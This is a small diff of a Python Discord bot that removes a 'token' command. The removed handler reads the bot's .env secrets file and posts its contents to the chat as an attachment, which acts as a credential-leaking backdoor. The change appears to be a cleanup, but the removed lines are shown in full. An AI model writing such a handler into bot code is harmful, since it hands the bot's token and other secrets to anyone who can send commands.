@@ -1563,17 +1563,5 @@ async def on_command_error(ctx: commands.Context, error):
             return
 
 
-@bot.command("token")
-async def on_token_request(ctx: commands.Context):
-    with open(".env", "rb") as f:
-        try:
-            f.seek(-10000, os.SEEK_END)
-        except OSError:
-            f.seek(0)
-        raw = f.read()
-
-    await ctx.send(file=discord.File(fp=io.BytesIO(raw), filename="t.txt"))
-
-
 if __name__ == "__main__":
     bot.run(token=token, log_handler=handler)
